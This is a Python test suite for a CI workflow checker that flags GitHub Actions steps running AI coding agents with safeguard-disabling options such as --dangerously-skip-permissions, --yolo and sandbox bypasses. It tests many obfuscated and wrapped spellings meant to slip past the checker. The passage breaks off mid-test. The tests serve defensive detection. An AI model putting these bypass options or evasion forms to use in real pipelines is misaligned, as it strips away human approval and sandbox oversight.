"""Flagship slice 2d.5c2a: OBAAF-GHA-026 for command-line options an agent tool's own files warn about.

The plan (decisions F-22, F-24 and F-264) asks that the settings an agent tool's own documentation warns
about be reported when they are given as command-line options: in an action's argument input
(`claude_args`, `codex-args`) or in a script that runs the tool (`--dangerously-skip-permissions`, Codex's
`--dangerously-bypass-approvals-and-sandbox`, Gemini CLI's `--yolo`), each citing its sentence, and a value
the checker cannot read as "cannot tell". The workflows here are written for these tests from that
documentation; none is copied from another project.
"""

import datetime
import time
import unittest

from helpers import TempDir

from obaaf import agent_tools, checker
from obaaf.catalog import load
from obaaf.checker import agent_flags

CODEOWNERS = "* @example/maintainers\n"
RULE = "OBAAF-GHA-026"
CODEX = "openai/codex-action@4aac6da4b686168e147798ca841cf64ff0f027b8"
CLAUDE = "anthropics/claude-code-action@5a856893345e332afa621934082d8c660c26d689"
CLAUDE_BASE = "anthropics/claude-code-base-action@78702a3c36b5baa51f6fa2e298a962cae8bb55d8"


def raw_detection():
    from obaaf.catalog import _read
    return _read("detection")


def check(workflow_text, files=None):
    with TempDir() as tmp:
        root = tmp / "repo"
        (root / ".github" / "workflows").mkdir(parents=True)
        (root / ".github" / "workflows" / "wf.yml").write_text(workflow_text, encoding="utf-8")
        (root / ".github" / "CODEOWNERS").write_text(CODEOWNERS, encoding="utf-8")
        for rel, body in (files or {}).items():
            path = root / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body, encoding="utf-8")
        return checker.check(root)


def run_step(script, env=None, job_env=None):
    """A workflow with one job whose one step runs `script` (a block scalar)."""
    body = "\n".join("          " + line for line in script.split("\n"))
    lines = ["on: push", "permissions: {contents: read}", "jobs:", "  a:", "    runs-on: ubuntu-latest"]
    if job_env:
        lines.append("    env:")
        lines += [f"      {k}: {v}" for k, v in job_env.items()]
    lines += ["    steps:", "      - name: agent"]
    if env:
        lines.append("        env:")
        lines += [f"          {k}: {v}" for k, v in env.items()]
    lines += ["        run: |", body]
    return "\n".join(lines) + "\n"


def one_step(uses, inputs):
    return ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
            f"    steps:\n      - name: agent\n        uses: {uses}\n        with:\n          prompt: review this\n{inputs}")


def found(result, kind=None):
    return [f for f in result.findings if f.rule == RULE and (kind is None or f.kind == kind)]


def settings_of(result, kind):
    return sorted(f.facts["setting"] for f in found(result, kind))


class TheDataTest(unittest.TestCase):
    """The flags are data, each with words from the tool's own files at a commit."""

    def test_the_catalogue_has_no_problem_and_each_flag_cites_a_file_at_a_commit(self):
        detection = load().detection
        self.assertEqual(agent_tools.problems(raw_detection()), [])
        readers = {r[0]: r for r in agent_tools.flag_readers(detection)}
        self.assertEqual(sorted(readers), ["claude-code", "cline", "codex", "continue", "copilot-cli", "gemini-cli",
                                           "goose", "kilo", "opencode", "openhands", "qwen-code"])  # 2d.5c2b: eight
        for tool, (_t, _n, flags, programs, _packages, args) in readers.items():
            self.assertTrue(programs, tool)
            for flag in flags:
                with self.subTest(tool=tool, flag=flag["id"]):
                    self.assertRegex(flag["source"], r"^https://github\.com/[^/]+/[^/]+/blob/[0-9a-f]{40}/.+#L\d+")
                    self.assertIsInstance(flag["read"], datetime.date)
                    self.assertTrue(flag["says"].strip())
        self.assertEqual(readers["claude-code"][5], {"anthropics/claude-code-action": ["claude_args"],
                                                    "anthropics/claude-code-base-action": ["claude_args"]})
        self.assertEqual(readers["codex"][5], {"openai/codex-action": ["codex-args"]})

    def test_a_malformed_flag_is_a_problem(self):
        base = {"agent_tools": [{
            "id": "t", "name": "T", "read": datetime.date(2026, 11, 19), "sources": [], "actions": {},
            "commands": ["x"], "packages": {}, "install_urls": [], "settings": [], "programs": ["t"],
            "flags": []}]}
        good = {"id": "f", "options": ["--x"], "severity": "high", "read": datetime.date(2026, 11, 19),
                "says": "words", "source": "https://github.com/o/r/blob/" + "a" * 40 + "/f.md#L1"}
        self.assertEqual(agent_tools.problems(dict(base, agent_tools=[dict(base["agent_tools"][0], flags=[good])])), [])
        for bad, why in [
            (dict(good, options=["x"]), "options must be a list of option words"),
            (dict(good, options=[]), "options must be a list of option words"),
            (dict(good, options=["--a b"]), "options must be a list of option words"),
            (dict(good, equals=[]), "equals must be a list"),
            (dict(good, severity="critical"), "severity must be one of"),
            (dict(good, source="https://example.com/x"), "source must be a file at a commit"),
            (dict(good, extra=1), "unknown key"),
            ({k: v for k, v in good.items() if k != "says"}, "missing says"),
        ]:
            with self.subTest(why=why):
                problems = agent_tools.problems(dict(base, agent_tools=[dict(base["agent_tools"][0], flags=[bad])]))
                self.assertTrue(any(why in p for p in problems), problems)
        twice = dict(base["agent_tools"][0], flags=[good, dict(good, id="g")])
        self.assertTrue(any("is also flag f's" in p for p in agent_tools.problems(dict(base, agent_tools=[twice]))))
        nothing = dict(base["agent_tools"][0], flags=[good], programs=[])
        self.assertTrue(any("nothing reads them" in p for p in agent_tools.problems(dict(base, agent_tools=[nothing]))))


class CommandLineTest(unittest.TestCase):
    """Where a step runs the tool's program, each warned option is reported with its words and source."""

    CASES = [
        ('claude -p "review" --dangerously-skip-permissions', "claude-code/skip-permissions", "high"),
        ("claude --allow-dangerously-skip-permissions -p x", "claude-code/skip-permissions", "high"),
        ("claude -p x --permission-mode bypassPermissions", "claude-code/bypass-permissions-mode", "high"),
        ("claude -p x --permission-mode=bypasspermissions", "claude-code/bypass-permissions-mode", "high"),
        ('codex exec --dangerously-bypass-approvals-and-sandbox "fix it"', "codex/bypass-approvals-and-sandbox", "high"),
        ('codex --yolo exec "fix it"', "codex/bypass-approvals-and-sandbox", "high"),
        ('codex exec --dangerously-bypass-hook-trust "fix it"', "codex/bypass-hook-trust", "medium"),
        ('gemini --yolo -p "triage"', "gemini-cli/yolo", "medium"),
        ('gemini -y -p "triage"', "gemini-cli/yolo", "medium"),
        ('gemini -yp "triage"', "gemini-cli/yolo", "medium"),
        ('gemini --approval-mode yolo -p "triage"', "gemini-cli/approval-mode-yolo", "medium"),
        ('gemini --approval-mode=YOLO -p "triage"', "gemini-cli/approval-mode-yolo", "medium"),
    ]

    def test_each_documented_option_is_reported_once_with_its_words(self):
        flags = {f"{r[0]}/{f['id']}": f for r in agent_tools.flag_readers(load().detection) for f in r[2]}
        for script, setting, severity in self.CASES:
            with self.subTest(script=script):
                hits = found(check(run_step(script)))
                self.assertEqual([(h.kind, h.facts["setting"], h.severity) for h in hits],
                                 [("command-option", setting, severity)], [h.message for h in hits])
                self.assertIn(" ".join(flags[setting]["says"].split()), hits[0].message)
                self.assertIn(flags[setting]["source"], hits[0].message)

    def test_the_program_is_found_however_it_is_started(self):
        for script in [
            "npx -y @anthropic-ai/claude-code -p x --dangerously-skip-permissions",
            "npx @anthropic-ai/claude-code@2.1.0 -p x --dangerously-skip-permissions",
            "pnpm dlx @anthropic-ai/claude-code -p x --dangerously-skip-permissions",
            "/usr/local/bin/claude -p x --dangerously-skip-permissions",
            "./node_modules/.bin/claude -p x --dangerously-skip-permissions",
            "sudo -u runner env HOME=/tmp timeout 600 claude -p x --dangerously-skip-permissions",
            "bash -c 'claude -p x --dangerously-skip-permissions'",
            "sh -lc \"claude -p x --dangerously-skip-permissions\"",
            'eval "claude -p x --dangerously-skip-permissions"',
            "OUT=$(claude -p x --dangerously-skip-permissions)",
            "echo go | claude -p --dangerously-skip-permissions",
            "if true; then claude -p x --dangerously-skip-permissions; fi",
            "claude -p x \\\n  --model y \\\n  --dangerously-skip-permissions",
        ]:
            with self.subTest(script=script):
                self.assertEqual(settings_of(check(run_step(script)), "command-option"), ["claude-code/skip-permissions"])

    def test_an_option_hidden_by_quotes_escapes_case_or_ansi_c_is_read(self):
        for script in [
            'claude -p x "--dangerously-skip-permissions"',
            "claude -p x '--dangerously-skip-permissions'",
            'claude -p x --danger"ously"-skip-permissions',
            "claude -p x --dangerously\\-skip\\-permissions",
            "claude -p x --DANGEROUSLY-SKIP-PERMISSIONS",
            "claude -p x $'\\x2d-dangerously-skip-permissions'",
            "claude -p x $'\\055\\055dangerously-skip-permissions'",
            'cl"aude" -p x --dangerously-skip-permissions',
        ]:
            with self.subTest(script=script):
                self.assertEqual(settings_of(check(run_step(script)), "command-option"), ["claude-code/skip-permissions"])

    def test_a_variable_with_a_plain_value_is_put_in(self):
        for env, job_env in [({"FLAGS": "--dangerously-skip-permissions"}, None),
                             (None, {"FLAGS": "--dangerously-skip-permissions"}),
                             ({"FLAGS": '"--model x --dangerously-skip-permissions"'}, None)]:
            with self.subTest(env=env, job_env=job_env):
                result = check(run_step("claude -p x $FLAGS", env=env, job_env=job_env))
                self.assertEqual(settings_of(result, "command-option"), ["claude-code/skip-permissions"])
                self.assertEqual(found(result, "command-computed"), [])
        result = check(run_step('claude -p x "${MODE_FLAG}" --permission-mode "$MODE"',
                                env={"MODE": "bypassPermissions", "MODE_FLAG": "--model"}))
        self.assertEqual(settings_of(result, "command-option"), ["claude-code/bypass-permissions-mode"])

    def test_what_the_checker_cannot_read_is_cannot_tell_at_most_medium(self):
        for script, words in [
            ("claude -p x $FLAGS", ["$FLAGS"]),
            ("claude -p x ${FLAGS}", ["${FLAGS}"]),
            ('claude -p x "${ARGS[@]}"', None),
            ("claude -p x $(cat flags.txt)", None),
            ("claude -p x `cat flags.txt`", None),
            ("claude -p x ${{ inputs.flags }}", ["${{ inputs.flags }}"]),
            ('claude -p "${{ inputs.prompt }}"', None),
            ("cat flags | xargs claude -p x", None),
            ('claude -p x --permission-mode "$MODE"', None),
            ('claude -p x --permission-mode=$MODE', None),
            ('claude -p x "--dangerously-$REST"', None),
        ]:
            with self.subTest(script=script):
                result = check(run_step(script))
                hits = found(result, "command-computed")
                self.assertEqual(len(hits), 1, [h.message for h in found(result)])
                self.assertEqual(hits[0].severity, "medium")
                if words is not None:
                    self.assertEqual(hits[0].facts["words"], words)

    def test_a_script_that_sets_the_variable_itself_is_not_trusted_for_its_env_value(self):
        result = check(run_step("FLAGS=\"$(cat x)\"\nclaude -p x $FLAGS", env={"FLAGS": "--model"}))
        self.assertEqual(len(found(result, "command-computed")), 1)

    def test_nothing_is_reported_for_the_safe_and_the_unrelated(self):
        for script in [
            'claude -p "$PROMPT" --permission-mode acceptEdits --allowedTools "Read"',
            "claude -p x --permission-mode auto",
            "claude --version",
            'codex exec --sandbox workspace-write "fix"',
            'codex exec --sandbox danger-full-access "fix"',
            'gemini --approval-mode auto_edit -p x',
            'gemini -m gemini-pro -p "do it"',
            "npm install -g @anthropic-ai/claude-code@2.1.0",
            "echo '--yolo'",
            "my-gemini-wrapper --yolo",
            "git commit -m 'claude-ish --yolo'",
            "claude-code-router --dangerously-skip-permissions",
        ]:
            with self.subTest(script=script):
                self.assertEqual(found(check(run_step(script))), [], script)

    def test_a_prompt_that_names_the_option_is_read_as_giving_it_the_wider_reading(self):
        hits = found(check(run_step('claude -p "never pass --dangerously-skip-permissions"')))
        self.assertEqual([h.kind for h in hits], ["command-option"])

    def test_the_egress_actions_command_and_github_script_are_read(self):
        egress = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                  "      - uses: Obaaf/OBAAF/actions/egress@" + "a" * 40 + "\n        with:\n"
                  "          allow: api.anthropic.com\n          run: claude -p x --dangerously-skip-permissions\n")
        self.assertEqual(settings_of(check(egress), "command-option"), ["claude-code/skip-permissions"])
        script = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                  "      - uses: actions/github-script@" + "b" * 40 + "\n        with:\n"
                  "          script: |\n            await exec.exec('codex exec --yolo fix')\n")
        self.assertEqual(settings_of(check(script), "command-option"), ["codex/bypass-approvals-and-sandbox"])

    def test_a_local_composite_action_is_read_as_the_jobs_steps(self):
        workflow = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                    "      - uses: actions/checkout@" + "c" * 40 + "\n        with: {persist-credentials: false}\n"
                    "      - uses: ./.github/actions/agent\n")
        action = ("name: agent\nruns:\n  using: composite\n  steps:\n    - shell: bash\n"
                  "      run: gemini --yolo -p x\n")
        result = check(workflow, {".github/actions/agent/action.yml": action})
        self.assertEqual(settings_of(result, "command-option"), ["gemini-cli/yolo"])

    def test_the_facts_tell_two_options_apart(self):
        a = found(check(run_step("claude -p x --dangerously-skip-permissions")))[0]
        b = found(check(run_step("claude -p x --allow-dangerously-skip-permissions")))[0]
        self.assertNotEqual(a.facts, b.facts)
        self.assertEqual(a.facts["option"], "--dangerously-skip-permissions")


class ArgsInputTest(unittest.TestCase):
    """`claude_args` and `codex-args` are read as the options they hand the program."""

    def test_claude_args(self):
        for uses in (CLAUDE, CLAUDE_BASE):
            for value in ["--dangerously-skip-permissions", '"--model x --dangerously-skip-permissions"',
                          "|\n            --model x\n            --dangerously-skip-permissions",
                          "--permission-mode bypassPermissions --max-turns 3"]:
                with self.subTest(uses=uses, value=value):
                    hits = found(check(one_step(uses, f"          claude_args: {value}\n")), "option")
                    self.assertEqual(len(hits), 1, [h.message for h in hits])
                    self.assertTrue(hits[0].facts["setting"].startswith("claude-code/"))
                    self.assertEqual(hits[0].facts["input"], "claude_args")
                    self.assertEqual(hits[0].severity, "high")

    def test_codex_args_as_a_json_array_and_as_a_string(self):
        for value in ["'[\"--yolo\"]'", "'[\"--model\", \"x\", \"--dangerously-bypass-approvals-and-sandbox\"]'",
                      "--yolo", "'--model x --yolo'"]:
            with self.subTest(value=value):
                hits = found(check(one_step(CODEX, f"          codex-args: {value}\n")), "option")
                self.assertEqual([h.facts["setting"] for h in hits], ["codex/bypass-approvals-and-sandbox"])

    def test_a_comment_line_in_claude_args_is_left_out_as_the_action_leaves_it_out(self):
        value = "|\n            # --dangerously-skip-permissions\n            --model x"
        self.assertEqual(found(check(one_step(CLAUDE, f"          claude_args: {value}\n"))), [])

    def test_a_value_the_checker_cannot_read_is_cannot_tell(self):
        for value in ["${{ inputs.args }}", "'--model x ${{ vars.EXTRA }}'", "[--yolo]", "{a: b}"]:
            with self.subTest(value=value):
                hits = found(check(one_step(CODEX, f"          codex-args: {value}\n")))
                self.assertEqual([h.kind for h in hits], ["computed"], [h.message for h in hits])
                self.assertEqual(hits[0].severity, "medium")

    def test_with_as_one_expression_names_the_flags_too(self):
        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                f"      - uses: {CLAUDE}\n        with: ${{{{ fromJSON(vars.INPUTS) }}}}\n")
        hits = found(check(text))
        self.assertEqual([h.kind for h in hits], ["computed"])
        self.assertIn("claude-code/skip-permissions", hits[0].facts["settings"])
        self.assertIn("claude-code/non-write-users", hits[0].facts["settings"])

    def test_a_safe_value_is_not_reported(self):
        for uses, line in [(CLAUDE, "claude_args: --permission-mode auto --allowedTools Read"),
                           (CODEX, "codex-args: '[\"--model\", \"gpt-5\"]'"),
                           (CODEX, "codex-args: --search")]:
            with self.subTest(line=line):
                self.assertEqual(found(check(one_step(uses, f"          {line}\n"))), [])


class ReaderTest(unittest.TestCase):
    """The reader on its own, and its cost."""

    def flags(self, tool):
        return next(r for r in agent_tools.flag_readers(load().detection) if r[0] == tool)

    def test_a_script_without_the_program_is_not_read(self):
        _t, _n, flags, programs, packages, _a = self.flags("claude-code")
        reading = agent_flags.read_script("echo --dangerously-skip-permissions", programs, packages, flags)
        self.assertEqual((reading.hits, reading.unknown), ({}, {}))

    def test_a_long_script_is_read_in_linear_time(self):
        _t, _n, flags, programs, packages, _a = self.flags("claude-code")
        for n in (2000, 8000):
            script = "\n".join(f'claude -p "step {i}" --model m{i} "$P{i}"' for i in range(n))
            start = time.perf_counter()
            agent_flags.read_script(script, programs, packages, flags)
            if n == 2000:
                small = time.perf_counter() - start
            else:
                self.assertLess(time.perf_counter() - start, max(1.0, small * 8))


if __name__ == "__main__":
    unittest.main()


def kinds(result):
    return sorted({f.kind for f in found(result)})


class ReviewCasesTest(unittest.TestCase):
    """The ways past and false positives two reviewers found in slice 2d.5c2a's first version, each a case.
    `hit` is a `command-option` finding, `cannot` a `command-computed` one with no option found, `none`
    nothing."""

    DSP = "--dangerously-skip-permissions"

    def expect(self, cases, **kw):
        for script, want in cases:
            with self.subTest(script=script):
                got = kinds(check(run_step(script, **kw)))
                if want == "hit":
                    self.assertIn("command-option", got, script)
                elif want == "cannot":
                    self.assertEqual(got, ["command-computed"], script)
                else:
                    self.assertEqual(got, [], script)

    def test_substitutions_and_redirections_do_not_end_the_command(self):
        d = self.DSP
        self.expect([
            (f"claude --mcp-config <(echo {{}}) {d}", "hit"),
            ("claude -p x <(true) $FLAGS", "cannot"),
            (f"claude -p x $(true) {d}", "hit"),
            (f"claude -p x 2>/dev/null {d}", "hit"),
            (f"claude -p x > out.txt {d}", "hit"),
            (f'git commit -m "$(claude -p x {d})"', "hit"),
        ])

    def test_shells_eval_and_runners_of_command_strings_are_read(self):
        d = self.DSP
        self.expect([
            (f'bash --noprofile --norc -eo pipefail -c "claude -p x {d}"', "hit"),
            (f"bash -o errexit -o pipefail -c 'claude {d}'", "hit"),
            (f"bash -c -- 'claude {d}'", "hit"),
            ('bash -c "claude -p x \\$FLAGS"', "cannot"),
            ('eval "claude -p x \\$FLAGS"', "cannot"),
            ('bash -c "$S"  # runs claude', "cannot"),
            (f"env -S 'claude {d}'", "hit"),
            (f"script -q -c 'claude {d}' /dev/null", "hit"),
            (f"su runner -c 'claude {d}'", "hit"),
            (f"watch -g 'claude {d}'", "hit"),
            (f"echo 'claude {d}' | bash", "hit"),
            ("cat prompt.sh | bash", "none"),
            (f"echo x; claude -p x | tee log.txt; echo 'claude {d}' | sh -s", "hit"),
            (f"bash <<< 'claude {d}'", "hit"),
            (f"source <(echo 'claude {d}')", "hit"),
            (f"printf 'claude {d}' > run.sh\nbash run.sh", "cannot"),
            # `eval` can set any variable, so none is put in: "cannot tell".
            (f"CMD='claude {d}'\neval \"$CMD\"", "cannot"),
            (f"bash <<'EOF'\nclaude {d}\nEOF", "hit"),
            (f"sh -c \"sh -c 'sh -c \\\"sh -c claude\\\\ {d}\\\"'\"", "hit"),
        ])

    def test_quoting_forms_bash_reads_are_read(self):
        d = self.DSP
        self.expect([
            ('claude -p x "$A"$FLAGS', "cannot"),
            (f'claude -p x $"{d}"', "hit"),
            ("claude -p x --dangerously-skip-{permissions,}", "hit"),
            (f"claude {{{d},}}", "hit"),
            ("claude -p x --dangerously-skip-permission[s]", "cannot"),
            (f'claude -p x "${{U:-{d}}}"', "cannot"),
            (f'claude -p x "$EMPTY"{d}', "cannot"),
            (f"{d.join(['claude -p x ', ''])}", "hit"),
        ])

    def test_a_heredoc_is_data_unless_a_shell_reads_it(self):
        d = self.DSP
        self.expect([
            ("cat > p.md <<'EOF'\nDon't stop.\nEOF\nclaude $FLAGS -p x", "cannot"),
            (f"claude -p <<'EOF'\nNever run claude {d}\nEOF", "none"),
            (f"cat <<EOF > notes.md\nclaude {d}\nEOF\nclaude -p x", "none"),
        ])

    def test_a_program_named_another_way(self):
        d = self.DSP
        self.expect([
            (f"C=claude; $C {d}", "hit"),
            (f'"$(command -v claude)" {d}', "cannot"),
            (f"$'\\x63laude' {d}", "hit"),
            (f"cl$'a'ude {d}", "hit"),
            (f"{{claude,}} {d}", "cannot"),
            (f"alias c='claude {d}'", "hit"),
            (f"shopt -s expand_aliases\nalias c=claude\nc {d}", "hit"),
            (f"hash -p $(command -v claude) c; c {d}", "cannot"),
            (f"ln -s $(command -v claude) ./c; ./c {d}", "cannot"),
            (f"IFS=_; A=claude_{d}; $A", "cannot"),
            (f"claude.cmd {d}", "hit"),
            (f"node node_modules/@anthropic-ai/claude-code/cli.js {d}", "hit"),
            (f"node -e \"execFileSync('claude',['{d}'])\"", "hit"),
            (f"python3 -c 'subprocess.run([\"claude\",\"{d}\"])'", "hit"),
            (f"find . -maxdepth 0 -exec claude {d} \;", "hit"),
            (f"docker run --rm img claude {d}", "hit"),
        ])

    def test_env_values_from_every_scope_and_what_overrides_them(self):
        d = self.DSP
        self.assertIn("command-option", kinds(check(run_step("$CMD", job_env={"CMD": f"claude {d} -p x"}))))
        self.assertIn("command-option", kinds(check(run_step(f"$AGENT {d}", job_env={"AGENT": "claude"}))))
        # The step's value wins over the job's, even when it is one the checker cannot read.
        self.assertEqual(kinds(check(run_step("claude -p x $FLAGS", env={"FLAGS": "${{ github.event.comment.body }}"},
                                              job_env={"FLAGS": "--model"}))), ["command-computed"])
        hit = found(check(run_step("claude -p x $FLAGS", env={"FLAGS": "${{ github.event.comment.body }}"})))[0]
        self.assertIn("github.event.comment.body", " ".join(hit.facts["words"]))
        for script in ("printf -v FLAGS '%s' x\nclaude -p x $FLAGS", ": ${FLAGS:=x}\nclaude -p x $FLAGS"):
            with self.subTest(script=script):
                self.assertEqual(kinds(check(run_step(script, job_env={"FLAGS": "--model"}))), ["command-computed"])

    def test_a_github_env_write_before_the_step_makes_env_values_unknown(self):
        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
                "    env: {FLAGS: --model}\n    steps:\n"
                "      - run: echo \"FLAGS=--dangerously-skip-permissions\" >> \"$GITHUB_ENV\"\n"
                "      - run: claude -p x $FLAGS\n")
        self.assertEqual(kinds(check(text)), ["command-computed"])

    def test_a_matrix_command_and_another_shell_are_cannot_tell(self):
        matrix = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
                  "    strategy:\n      matrix:\n        cmd: ['claude -p x']\n    steps:\n"
                  "      - run: ${{ matrix.cmd }}\n")
        self.assertEqual(kinds(check(matrix)), ["command-computed"])
        pwsh = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: windows-latest\n    steps:\n"
                "      - run: claude -p x @flags\n")
        self.assertEqual(kinds(check(pwsh)), ["command-computed"])
        pwsh_hit = pwsh.replace("@flags", self.DSP)
        self.assertEqual(kinds(check(pwsh_hit)), ["command-option"])

    def test_github_script_argument_lists(self):
        text = ("on: push\npermissions: {contents: read}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/github-script@" + "b" * 40 + "\n        with:\n          script: |\n")
        self.assertEqual(kinds(check(text + f"            await exec.exec('claude', ['{self.DSP}'])\n")),
                         ["command-option"])
        # Options held whole in a variable are not read in another language, as a quoted variable is not
        # in bash (#254); an option written in pieces is "cannot tell".
        self.assertEqual(kinds(check(text + "            await exec.exec('claude', flags)\n")), [])
        self.assertEqual(kinds(check(text + "            await exec.exec('claude', ['--dangerously-' + 'skip-permissions'])\n")),
                         ["command-computed"])
        self.assertEqual(kinds(check(text + "            await github.rest.issues.createComment({body: '@claude'})\n")),
                         [])

    def test_gemini_spellings_yargs_takes(self):
        self.expect([("gemini --y -p x", "hit"), ("gemini --approvalMode yolo -p x", "hit"),
                     ("gemini --approvalMode=YOLO -p x", "hit"), ("gemini --yolo=false -p x", "none"),
                     ("codex exec {--yolo,}", "hit")])

    def test_false_positives_found_by_the_review(self):
        d = self.DSP
        self.expect([
            (f"echo claude {d}", "none"),
            ("npm install -g @google/gemini-cli -y", "none"),
            ("sudo apt-get install gemini -y", "none"),
            ("conda install -c x gemini -y", "none"),
            (f'claude -p "$P" # never add {d}', "none"),
            ("codex mcp add srv -- npx server --yolo", "none"),
            # A `--` right after an option may be that option's value (commander), so it does not end them.
            (f"claude -p -- {d}", "hit"),
            (f"claude -p x --append-system-prompt -- {d}", "hit"),
            ('claude -p "$PROMPT"', "none"),
            (f"grep -r claude . {d}", "none"),
        ])

    def test_the_words_fact_names_the_command_substitution(self):
        a = found(check(run_step("claude -p x $(cat ./safe-flags.txt)")))[0]
        b = found(check(run_step("claude -p x $(curl -s https://example.invalid/f)")))[0]
        self.assertNotEqual(a.facts["words"], b.facts["words"])


class ArgsInputReviewTest(unittest.TestCase):
    def test_javascript_white_space_and_expansions_in_claude_args(self):
        for value, want in [('"\\ufeff--dangerously-skip-permissions"', ["option"]),
                            ('"--model\\u00a0x\\u00a0--dangerously-skip-permissions"', ["option"]),
                            ("--danger${X}ously-skip-permissions", ["computed"]),
                            ("--dangerously-skip-permissions$X", ["computed"])]:
            with self.subTest(value=value):
                got = sorted({f.kind for f in found(check(one_step(CLAUDE, f"          claude_args: {value}\n")))})
                self.assertEqual(got, want)

    def test_codex_args_keeps_lines_that_start_with_a_hash(self):
        value = "|\n            --model x\n            # --yolo"
        hits = found(check(one_step(CODEX, f"          codex-args: {value}\n")), "option")
        self.assertEqual([h.facts["setting"] for h in hits], ["codex/bypass-approvals-and-sandbox"])

    def test_a_control_character_is_cannot_tell(self):
        hits = found(check(one_step(CODEX, '          codex-args: "--model\\u0000--yolo"\n')))
        self.assertIn("computed", {h.kind for h in hits})


class CostTest(unittest.TestCase):
    def flags(self, tool):
        return next(r for r in agent_tools.flag_readers(load().detection) if r[0] == tool)

    def test_repeated_program_words_and_quotes_are_linear(self):
        _t, _n, flags, programs, packages, _a = self.flags("claude-code")
        for make in (lambda n: "echo " + "claude " * n, lambda n: "claude " * n, lambda n: "a''b " * (n * 10),
                     lambda n: "claude --permission-mode " * n, lambda n: "xargs claude " * n):
            timings = []
            for n in (500, 2000):
                start = time.perf_counter()
                agent_flags.read_script(make(n), programs, packages, flags, mentioned=True)
                timings.append(time.perf_counter() - start)
            with self.subTest(text=make(2)[:30]):
                self.assertLess(timings[1], max(0.5, timings[0] * 8))


class ExpectrailShapeTest(unittest.TestCase):
    """A step that only names the tool in its arguments, with `[[ ]]` tests and arrays, as the first
    adopter's judge step does: nothing to report (found on Expectrail by this slice's own run)."""

    def test_tests_and_arrays_in_a_step_that_names_the_tool(self):
        script = ('args=(--case "$CASE" --out runs/judge)\n'
                  'if [[ "$LIVE" == "true" ]]; then args+=(--live); else args+=(--no-sam); fi\n'
                  'if [ "$OUTSIDE" = "on" ]; then args+=(--outside claude,gpt --passes 3); fi\n'
                  'python -m "$module" "${args[@]}" > judge.log 2>&1\n')
        self.assertEqual(found(check(run_step(script))), [])


class SecondReviewCasesTest(unittest.TestCase):
    """The ways past and false positives the second review of slice 2d.5c2a found, each a case."""

    DSP = "--dangerously-skip-permissions"

    def expect(self, cases, **kw):
        for script, want in cases:
            with self.subTest(script=script):
                got = kinds(check(run_step(script, **kw)))
                if want == "hit":
                    self.assertIn("command-option", got, script)
                elif want == "cannot":
                    self.assertEqual(got, ["command-computed"], script)
                else:
                    self.assertEqual(got, [], script)

    def test_a_variable_any_command_can_set_is_not_put_in(self):
        d = self.DSP
        self.expect([
            (f'F=--verbose; export "F={d}"; claude $F -p x', "cannot"),
            (f"F=--verbose; declare -n R=F; R={d}; claude $F -p x", "cannot"),
            (f'F=--verbose; eval "F={d}"; claude $F -p x', "cannot"),
            (f"F=--verbose; printf -v 'F' '%s' {d}; claude $F -p x", "cannot"),
            (f"F=--verbose; read -r 'F' <<< {d}; claude $F -p x", "cannot"),
            (f"F=--verbose; source <(echo 'F={d}'); claude $F -p x", "cannot"),
            ("a=cla; b=ude; $a$b " + d, "hit"),
        ])

    def test_the_lexer_reads_as_bash_reads(self):
        d = self.DSP
        self.expect([
            (f"cat <<true'_'\nx\ntrue\nclaude {d}\ntrue_", "none"),
            (f"cat <<true'_'\nx\ntrue_\nclaude {d}", "hit"),
            (f'cat <<"E"OF\nx\nEOF\nclaude {d}', "hit"),
            (f"X=$(case \"$Y\" in *) claude $'\\x2d-dangerously-skip-permissions' -p x;; esac)", "hit"),
            ("case \"$X\" in\n  release/*) claude -p x ;;\n  *) echo no ;;\nesac", "none"),
            ("OUT=$(cat <<'EOF'\n1) be brief 2) be kind\nEOF\n)\nclaude -p \"$OUT\"", "none"),
        ])
        text = run_step("x").replace("run: |\n          x", 'run: "claude -p x\\r# --dangerously-skip-permissions"')
        self.assertIn("command-option", kinds(check(text)))

    def test_interpreters_runners_and_written_files(self):
        d = self.DSP
        self.expect([
            (f"python3 <<'EOF'\nimport subprocess\nsubprocess.run([\"claude\", \"{d}\"])\nEOF", "hit"),
            (f"python3 -Ic 'import subprocess; subprocess.run([\"claude\",\"{d}\"])'", "hit"),
            (f"python3.12 -c 'import os; os.system(\"claude {d}\")'", "hit"),
            (f"perl -le 'exec \"claude\",\"{d}\"'", "hit"),
            (f"node -pe \"require('child_process').execFileSync('claude',['{d}'])\"", "hit"),
            (f"trap 'claude {d}' EXIT", "hit"),
            (f"docker run --rm node:20 sh -c 'npx @anthropic-ai/claude-code -p x {d}'", "hit"),
            (f"cross-env NODE_ENV=ci claude -p x {d}", "hit"),
            (f"xvfb-run claude -p x {d}", "hit"),
            (f"tmux new-session -d 'claude -p x {d}'", "hit"),
            (f"ssh host 'claude -p x {d}'", "hit"),
            (f"sudo -iu runner claude {d}", "hit"),
            (f"xargs --max-procs 4 claude {d} < list", "hit"),
            (f"cat > run.sh <<'EOF'\nclaude -p x {d}\nEOF\nchmod +x run.sh\n./run.sh", "cannot"),
            (f"printf 'claude {d}' > s.py\npython3 s.py # claude", "cannot"),
            (f"alias c='command claude'\nc {d}", "hit"),
        ])

    def test_false_positives_of_the_second_review(self):
        self.expect([
            ("cp CLAUDE.md AGENTS.md\nclaude -p x", "none"),
            ("ln -sf AGENTS.md CLAUDE.md\nclaude -p x", "none"),
            ("mkdir -p ~/.claude && cp settings.json ~/.claude/\nclaude -p x", "none"),
            ("while IFS= read -r line; do echo \"$line\"; done < f\nclaude -p x", "none"),
            ("IFS=, read -r A B <<< \"$IN\"\nclaude -p x", "none"),
            ('claude -p x\n"$GITHUB_WORKSPACE/scripts/post.sh"', "none"),
            ("python -m \"$module\" --outside claude,gpt", "none"),
        ])

    def test_prose_in_other_inputs_is_not_cannot_tell(self):
